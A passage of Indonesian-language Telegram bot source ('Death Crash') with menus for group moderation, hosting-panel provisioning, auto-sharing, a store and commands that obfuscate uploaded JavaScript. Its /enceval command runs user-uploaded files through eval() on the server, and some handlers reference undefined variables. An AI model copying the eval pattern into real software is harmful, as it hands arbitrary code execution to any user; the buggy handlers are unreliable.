        console.error("Gagal editMessageCaption & editMessageMedia:", err2);
        
        await ctx.reply(menuCaption, {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⬅️ Back to Start", callback_data: "back_to_start" }]
            ]
          }
        });
      }
    }
  } catch (err) {
    console.error("Error di callback menu_owner:", err);
    try { await ctx.reply("Terjadi kesalahan saat menampilkan menu."); } catch {}
  }
});

bot.action("menu_group", async (ctx) => {
  try {
    await ctx.answerCbQuery();

    const menuCaption = `
\`\`\`
╭━━━━( MENU GROUP )━━━━╮
│ /mute ( durasi )
│ /unmute
│ /kick
│ /ban
│ /unban
│ /pin
│ /unpin
│ /promote ( reply )
│ /demote ( reply )
│ /antilink ( on | off)
│ /clear -> Clear semua chat
│ /alltag
╰━━━━━━━━━━━━━━━━━━╯
\`\`\`
`;

    try {
      await ctx.editMessageCaption(menuCaption, {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⬅️ Back to Start", callback_data: "back_to_start" }
            ]
          ]
        }
      });
    } catch (err) {

      try {
        await ctx.editMessageMedia(
          {
            type: "photo",
            media: "https://files.catbox.moe/lker0z.jpg",
            caption: menuCaption,
            parse_mode: "Markdown"
          },
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "⬅️ Back to Start", callback_data: "back_to_start" }
                ]
              ]
            }
          }
        );
      } catch (err2) {
        console.error("Gagal editMessageCaption & editMessageMedia:", err2);
        
        await ctx.reply(menuCaption, {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⬅️ Back to Start", callback_data: "back_to_start" }]
            ]
          }
        });
      }
    }
  } catch (err) {
    console.error("Error di callback menu_owner:", err);
    try { await ctx.reply("Terjadi kesalahan saat menampilkan menu."); } catch {}
  }
});

bot.action("menu_panel", async (ctx) => {
  try {
    await ctx.answerCbQuery();

    const menuCaption = `
\`\`\`
╭━━━━( MENU PANEL )━━━━╮
│ /1gb <nama> <ID>
│ /2gb <nama> <ID>
│ /3gb <nama> <ID>
│ /4gb <nama> <ID>
│ /5gb <nama> <ID>
│ /6gb <nama> <ID>
│ /7gb <nama> <ID>
│ /8gb <nama> <ID>
│ /9gb <nama> <ID>
│ /10gb <nama> <ID>
│ /unli <nama> <ID>
│ /adp <nama> <ID>
│ /deladp < ID SERVER >
│ /listadp
│ /delsrv < ID SERVER >
│ /listsrv
╰━━━━━━━━━━━━━━━━━━╯

⚠️ Menu ini Khusus Admin!!!
\`\`\`
`;

    try {
      await ctx.editMessageCaption(menuCaption, {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⬅️ Back to Start", callback_data: "back_to_start" }
            ]
          ]
        }
      });
    } catch (err) {

      try {
        await ctx.editMessageMedia(
          {
            type: "photo",
            media: "https://files.catbox.moe/lker0z.jpg",
            caption: menuCaption,
            parse_mode: "Markdown"
          },
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "⬅️ Back to Start", callback_data: "back_to_start" }
                ]
              ]
            }
          }
        );
      } catch (err2) {
        console.error("Gagal editMessageCaption & editMessageMedia:", err2);
        
        await ctx.reply(menuCaption, {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⬅️ Back to Start", callback_data: "back_to_start" }]
            ]
          }
        });
      }
    }
  } catch (err) {
    console.error("Error di callback menu_owner:", err);
    try { await ctx.reply("Terjadi kesalahan saat menampilkan menu."); } catch {}
  }
});

bot.action("menu_jasher", async (ctx) => {
  try {
    await ctx.answerCbQuery();

    const menuCaption = `
\`\`\`
╭━━━━( MENU JASHER )━━━━╮
│ /sharemsg
│ /autoshare <timer>
│ /delshare <no>
│ /stop
│ /listshare
╰━━━━━━━━━━━━━━━━━━╯
\`\`\`
`;

    try {
      await ctx.editMessageCaption(menuCaption, {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⬅️ Back to Start", callback_data: "back_to_start" }
            ]
          ]
        }
      });
    } catch (err) {

      try {
        await ctx.editMessageMedia(
          {
            type: "photo",
            media: "https://files.catbox.moe/lker0z.jpg",
            caption: menuCaption,
            parse_mode: "Markdown"
          },
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "⬅️ Back to Start", callback_data: "back_to_start" }
                ]
              ]
            }
          }
        );
      } catch (err2) {
        console.error("Gagal editMessageCaption & editMessageMedia:", err2);
        
        await ctx.reply(menuCaption, {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⬅️ Back to Start", callback_data: "back_to_start" }]
            ]
          }
        });
      }
    }
  } catch (err) {
    console.error("Error di callback menu_owner:", err);
    try { await ctx.reply("Terjadi kesalahan saat menampilkan menu."); } catch {}
  }
});

bot.action("menu_add", async (ctx) => {
  try {
    await ctx.answerCbQuery();

    const menuCaption = `
\`\`\`
╭━━━━( MENU ADDB )━━━━╮
│ /addtoken
│ /deltoken
│ /listtoken
╰━━━━━━━━━━━━━━━━━━╯
\`\`\`
`;

    try {
      await ctx.editMessageCaption(menuCaption, {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⬅️ Back to Start", callback_data: "back_to_start" }
            ]
          ]
        }
      });
    } catch (err) {

      try {
        await ctx.editMessageMedia(
          {
            type: "photo",
            media: "https://files.catbox.moe/lker0z.jpg",
            caption: menuCaption,
            parse_mode: "Markdown"
          },
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "⬅️ Back to Start", callback_data: "back_to_start" }
                ]
              ]
            }
          }
        );
      } catch (err2) {
        console.error("Gagal editMessageCaption & editMessageMedia:", err2);
        
        await ctx.reply(menuCaption, {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⬅️ Back to Start", callback_data: "back_to_start" }]
            ]
          }
        });
      }
    }
  } catch (err) {
    console.error("Error di callback menu_owner:", err);
    try { await ctx.reply("Terjadi kesalahan saat menampilkan menu."); } catch {}
  }
});

bot.action("menu_store", async (ctx) => {
  try {
    await ctx.answerCbQuery();

    const menuCaption = `
\`\`\`
╭━━━━( MENU STORE )━━━━╮
│ /buy
│ /orders -> Lihat daftar order
│ /listproduk
│ /cancel
╰━━━━━━━━━━━━━━━━━━╯
\`\`\`
`;

    try {
      await ctx.editMessageCaption(menuCaption, {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⬅️ Back to Start", callback_data: "back_to_start" }
            ]
          ]
        }
      });
    } catch (err) {

      try {
        await ctx.editMessageMedia(
          {
            type: "photo",
            media: "https://files.catbox.moe/lker0z.jpg",
            caption: menuCaption,
            parse_mode: "Markdown"
          },
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "⬅️ Back to Start", callback_data: "back_to_start" }
                ]
              ]
            }
          }
        );
      } catch (err2) {
        console.error("Gagal editMessageCaption & editMessageMedia:", err2);
        
        await ctx.reply(menuCaption, {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⬅️ Back to Start", callback_data: "back_to_start" }]
            ]
          }
        });
      }
    }
  } catch (err) {
    console.error("Error di callback menu_owner:", err);
    try { await ctx.reply("Terjadi kesalahan saat menampilkan menu."); } catch {}
  }
});

bot.action("menu_admin", async (ctx) => {
  try {
    await ctx.answerCbQuery();

    const menuCaption = `
\`\`\`
╭━━━━( MENU ADMIN )━━━━╮
│ /addproduk <nama> <harga>
│ /delproduk <ID>
│ /listproduk
│ /listorder
│ /addfile -> Menambahkan \nfile ke github
│ /delfile -> Hapus file
│ /listfile
╰━━━━━━━━━━━━━━━━━━╯
\`\`\`
`;

    try {
      await ctx.editMessageCaption(menuCaption, {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⬅️ Back to Start", callback_data: "back_to_start" }
            ]
          ]
        }
      });
    } catch (err) {

      try {
        await ctx.editMessageMedia(
          {
            type: "photo",
            media: "https://files.catbox.moe/lker0z.jpg",
            caption: menuCaption,
            parse_mode: "Markdown"
          },
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "⬅️ Back to Start", callback_data: "back_to_start" }
                ]
              ]
            }
          }
        );
      } catch (err2) {
        console.error("Gagal editMessageCaption & editMessageMedia:", err2);
        
        await ctx.reply(menuCaption, {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⬅️ Back to Start", callback_data: "back_to_start" }]
            ]
          }
        });
      }
    }
  } catch (err) {
    console.error("Error di callback menu_owner:", err);
    try { await ctx.reply("Terjadi kesalahan saat menampilkan menu."); } catch {}
  }
});

bot.action("menu_pay", async (ctx) => {
  try {
    await ctx.answerCbQuery();

    const menuCaption = `
\`\`\`
SILAHKAN TRANSFER KE QRIS DI ATAS DAN KIRIM BUKTI TRANSFER KE ADMIN!!!
\`\`\`
`;

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: settings.PAYMENT_QRIS_URL,
        caption: menuCaption,
        parse_mode: "Markdown"
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Developer", url: "https://t.me/Death_co" }],
            [{ text: "⬅️ Back to Start", callback_data: "back_to_start" }]
          ]
        }
      }
    );

  } catch (err) {
    console.error("Gagal tampilkan menu_pay:", err);

    try {
      await ctx.replyWithPhoto(
        settings.PAYMENT_QRIS_URL,
        {
          caption: menuCaption,
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "Developer", url: "https://t.me/Death_co" }],
              [{ text: "⬅️ Back to Start", callback_data: "back_to_start" }],
            ]
          }
        }
      );
    } catch (err2) {
      console.error("Gagal kirim foto fallback:", err2);
    }
  }
});

bot.action("back_to_start", async (ctx) => {
  try {
    await ctx.answerCbQuery();

    const userName = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
    const userId = ctx.from.id;

    const startCaption = `
\`\`\`
╭━━━━( 𝐃𝐄𝐀𝐓𝐇 𝐊𝐈𝐍𝐆𝐒 )━━━━╮
│友 ɴᴀᴍᴇ ʙᴏᴛ : 𝐒𝐂 𝐌𝐃 𝐃𝐄𝐀𝐓𝐇 𝐂𝐑𝐀𝐒𝐇
│友 ᴠᴇʀsɪᴏɴ : 3.0
│友 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @Death_co
╰━━━━━━━━━━━━━━━━━━━━━━╯
╭━━━( 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 )━━━━╮
│• Username : ${userName}
│• ID-User : ${userId}
╰━━━━━━━━━━━━━━━━━━━╯

• /lapor <text> -> Untuk Melaporkan \nJika Ada Yang Error
\`\`\`
`;

    try {
      await ctx.editMessageText(startText, {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "🔐 Menu Enc", callback_data: "menu_enc" },
              { text: "⚙️ Menu Tools", callback_data: "menu_tools" }
            ],
            [
              { text: "👥️️ Menu Group", callback_data: "menu_group" },
              { text: "️💾 Menu Panel", callback_data: "menu_panel" }
            ],
            [
              { text: "️📢 Menu Jasher", callback_data: "menu_jasher" },
              { text: "️🛒 Menu Store", callback_data: "menu_store" }
            ],
            [
              { text: "🔑 MENU ADDB", callback_data: "menu_add" },
              { text: "️👑 Menu Admin", callback_data: "menu_admin" }
            ],
            [    
              { text: "💳 Payment", callback_data: "menu_pay" }
            ],
            [    
              { text: "Developer", url: "https://t.me/Death_co" }
            ]
          ]
        }
      });
    } catch (err) {

      try {
        await ctx.editMessageMedia(
          {
            type: "photo",
            media: "https://files.catbox.moe/lker0z.jpg",
            caption: startCaption,
            parse_mode: "Markdown"
          },
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "🔐 Menu Enc", callback_data: "menu_enc" },
                  { text: "⚙️ Menu Tools", callback_data: "menu_tools" }
                ],
                [
              { text: "👥️ ️Menu Group", callback_data: "menu_group" },
              { text: "️💾 Menu Panel", callback_data: "menu_panel" }
               ],
               [
              { text: "️📢 Menu Jasher", callback_data: "menu_jasher" },
              { text: "️🛒 Menu Store", callback_data: "menu_store" }
               ],
               [
              { text: "🔑 MENU ADDB", callback_data: "menu_add" },
              { text: "️👑 Menu Admin", callback_data: "menu_admin" }
               ],
                [    
                  { text: "💳 Payment", callback_data: "menu_pay" }
                ],
                 [    
                   { text: "Developer", url: "https://t.me/Death_co" }
                 ]
              ]
            }
          }
        );
      } catch (err2) {
        console.error("Gagal kembalikan caption via edit:", err2);
        
        await ctx.replyWithPhoto("https://files.catbox.moe/lker0z.jpg", {
          caption: startCaption,
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "🔐 Menu Enc", callback_data: "menu_enc" },
                { text: "⚙️ Menu Tools", callback_data: "menu_tools" }
              ],
              [
              { text: "👥️️ Menu Group", callback_data: "menu_group" },
              { text: "️💾 Menu Panel", callback_data: "menu_panel" }
             ],
             [
              { text: "️📢 Menu Jasher", callback_data: "menu_jasher" },
              { text: "️🛒 Menu Store", callback_data: "menu_store" }
             ],
             [
              { text: "🔑 MENU ADDB", callback_data: "menu_add" },
              { text: "️👑 Menu Admin", callback_data: "menu_admin" }
             ],
             [    
               { text: "💳 Payment", callback_data: "menu_pay" }
             ],
             [    
                { text: "Developer", url: "https://t.me/Death_co" }
             ]
            ]
          }
        });
      }
    }
  } catch (err) {
    console.error("Error di callback back_to_start:", err);
    try { await ctx.reply("Terjadi kesalahan saat kembali ke tampilan awal."); } catch {}
  }
})

// Command /enceval (diperkuat dengan pemeriksaan channel)
bot.command("enceval", async (ctx) => {
    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

    if (!isChannelMember || !isGroupMember) {
        return ctx.reply(
            "❌ Anda harus join *channel & group* dulu sebelum memakai command",
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
                        [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
                    ]
                }
            }
        );
    }

  // kalau belum reply file .js
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.reply("❌ *Error:* Balas file .js dengan `/enceval [level]`!", { parse_mode: "Markdown" });
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.reply("❌ *Error:* Hanya file .js yang didukung!", { parse_mode: "Markdown" });
  }

  const args = ctx.message.text.split(" ");
  const encryptionLevel = ["low", "medium", "high"].includes(args[1]) ? args[1] : "high";
  const encryptedPath = path.join(__dirname, `eval-encrypted-${file.file_name}`);

  try {
    const progressMessage = await ctx.reply(
      "```css\n" +
      "🔒 EncryptBot\n" +
      ` ⚙️ Memulai Evaluasi (${encryptionLevel}) (1%)\n` +
      ` ${createProgressBar(1)}\n` +
      "```\n" +
      "PROSES ENCRYPT",
      { parse_mode: "Markdown" }
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    console.log(`Mengunduh file: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 10, "Mengunduh");
    const response = await fetch(fileLink);
    const fileContent = await response.text();
    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    let evalResult;
    try {
      await updateProgress(ctx, progressMessage, 30, "Mengevaluasi Kode Asli");
      evalResult = eval(fileContent);
      if (typeof evalResult === "function") evalResult = "Function detected (tidak bisa ditampilkan)";
      else if (evalResult === undefined) evalResult = "No return value";
    } catch (evalError) {
      evalResult = `Evaluation error: ${evalError.message}`;
    }

    console.log(`Mengenkripsi file dengan level: ${encryptionLevel}`);
    await updateProgress(ctx, progressMessage, 50, "Inisialisasi Hardened Enkripsi");
    const obfuscated = await JsConfuser.obfuscate(fileContent, getObfuscationConfig(encryptionLevel));
    await updateProgress(ctx, progressMessage, 70, "Transformasi Kode");
    await fs.writeFile(encryptedPath, obfuscated.code);
    await updateProgress(ctx, progressMessage, 90, "Finalisasi Enkripsi");

    await ctx.reply(
      "```css\n" +
      "🔒 EncryptBot - Evaluation Result\n" +
      "```\n" +
      `✨ *Original Code Result:* \n\`\`\`javascript\n${evalResult}\n\`\`\`\n` +
      `_Level: ${encryptionLevel} | Powered by Xhinn_`,
      { parse_mode: "Markdown" }
    );

    await ctx.replyWithDocument(
      { source: encryptedPath, filename: `eval-encrypted-${file.file_name}` },
      { caption: "✅ *File terenkripsi siap!*\n_SUKSES ENCRYPT 🕊", parse_mode: "Markdown" }
    );

    await updateProgress(ctx, progressMessage, 100, `Evaluasi & Enkripsi (${encryptionLevel})`);

    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      console.log(`File sementara dihapus: ${encryptedPath}`);
    }
  } catch (error) {
    console.error("Kesalahan saat eval/encrypt:", error);
    await ctx.reply(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}`, { parse_mode: "Markdown" });
    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      console.log(`File sementara dihapus setelah error: ${encryptedPath}`);
    }
  }
});

// Command /encchina (diperkuat dengan pemeriksaan channel)
bot.command("encchina", async (ctx) => {

    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

    if (!isChannelMember || !isGroupMember) {
        return ctx.reply(
            "❌ Anda harus join *channel & group* dulu sebelum memakai command",
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
                        [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
                    ]
                }
            }
        );
    }
    
    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encchina`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `china-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (Hardened Mandarin) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "PROSES ENCRYPT "
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Mandarin obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Mandarin yang diperkuat`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened Mandarin Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getMandarinObfuscationConfig());
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");
        await fs.writeFile(encryptedPath, obfuscated.code);
        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscated.code);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        log(`Mengirim file terenkripsi gaya Mandarin: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `china-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Hardened Mandarin) siap!*\nSUKSES ENCRYPT 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Hardened Mandarin Obfuscation Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Mandarin obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

// Command /encarab (diperkuat dengan pemeriksaan channel)
bot.command("encarab", async (ctx) => {

    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

    if (!isChannelMember || !isGroupMember) {
        return ctx.reply(
            "❌ Anda harus join *channel & group* dulu sebelum memakai command",
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
                        [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
                    ]
                }
            }
        );
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encarab`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `arab-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (Hardened Arab) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "PROSES ENCRYPT"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Arab obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Arab yang diperkuat`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened Arab Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getArabObfuscationConfig());
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");
        await fs.writeFile(encryptedPath, obfuscated.code);
        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscated.code);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        log(`Mengirim file terenkripsi gaya Arab: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `arab-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Hardened Arab) siap!*\nSUKSES ENCRYPT 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Hardened Arab Obfuscation Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Arab obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

// Command /encjapan (Japan-style obfuscation baru, diperkuat dengan pemeriksaan channel)
bot.command("encjapan", async (ctx) => {

    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

    if (!isChannelMember || !isGroupMember) {
        return ctx.reply(
            "❌ Anda harus join *channel & group* dulu sebelum memakai command",
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
                        [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
                    ]
                }
            }
        );
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encjapan`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `japan-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (Hardened Japan) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "PROSES ENCRYPT "
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Japan obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Japan yang diperkuat`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened Japan Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getJapanObfuscationConfig());
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");
        await fs.writeFile(encryptedPath, obfuscated.code);
        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscated.code);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        log(`Mengirim file terenkripsi gaya Japan: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `japan-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Hardened Japan) siap!*\nSUKSES ENCRYPT 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Hardened Japan Obfuscation Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Japan obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

// Command /deobfuscate (diperbaiki untuk menangani Promise dan validasi)
bot.command("deobfuscate", async (ctx) => {

    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

    if (!isChannelMember || !isGroupMember) {
        return ctx.reply(
            "❌ Anda harus join *channel & group* dulu sebelum memakai command",
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
                        [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
                    ]
                }
            }
        );
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js yang diobfuscate dengan `/deobfuscate`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const deobfuscatedPath = path.join(__dirname, `deobfuscated-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai Deobfuscation (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "PROSES ENCRYPT "
        );

        // Mengunduh file
        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk deobfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        // Validasi kode awal
        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode Awal");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        // Proses deobfuscation dengan webcrack
        log(`Memulai deobfuscation dengan webcrack: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 40, "Memulai Deobfuscation");
        const result = await webcrack(fileContent); // Pastikan await digunakan
        let deobfuscatedCode = result.code;

        // Penanganan jika kode dibundel
        let bundleInfo = "";
        if (result.bundle) {
            bundleInfo = "// Detected as bundled code (e.g., Webpack/Browserify)\n";
            log(`Kode terdeteksi sebagai bundel: ${file.file_name}`);
        }

        // Jika tidak ada perubahan signifikan atau hasil bukan string
        if (!deobfuscatedCode || typeof deobfuscatedCode !== "string" || deobfuscatedCode.trim() === fileContent.trim()) {
            log(`Webcrack tidak dapat mendekode lebih lanjut atau hasil bukan string: ${file.file_name}`);
            deobfuscatedCode = `${bundleInfo}// Webcrack tidak dapat mendekode sepenuhnya atau hasil invalid\n${fileContent}`;
        }

        // Validasi kode hasil
        log(`Memvalidasi kode hasil deobfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 60, "Memvalidasi Kode Hasil");
        let isValid = true;
        try {
            new Function(deobfuscatedCode);
            log(`Kode hasil valid: ${deobfuscatedCode.substring(0, 50)}...`);
        } catch (syntaxError) {
            log(`Kode hasil tidak valid: ${syntaxError.message}`);
